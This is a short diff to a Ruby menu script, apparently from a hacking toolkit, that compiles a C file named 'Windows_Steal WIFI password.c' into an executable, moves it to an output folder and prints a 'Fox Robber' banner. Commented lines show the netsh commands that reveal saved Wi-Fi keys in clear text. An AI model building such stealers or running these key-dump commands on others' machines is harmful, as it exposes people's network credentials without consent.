@@ -49,13 +49,12 @@ while true
             puts 'Loading...'
             #'netsh wlan show profile'
             #'netsh wlan show profile WiFi-name key=clear'
-            puts 'File made by Fox Robber 🦊'
             system('gcc Windows/Windows_Steal\ WIFI\ password.c')
-            system('sleep 1')
             system('mv a.out Windows_s.out')
-            system('sleep 1')
-            system('mv Windows_s.out Out/')
             system('chmod +x Windows_s.out')
+            system('mv Windows_s.out Out/')
+            system('clear')
+            puts 'File made by Fox Robber 🦊'
             system("echo \"\t<Press enter>\" | lolcat -a")
             gets.chomp
             break
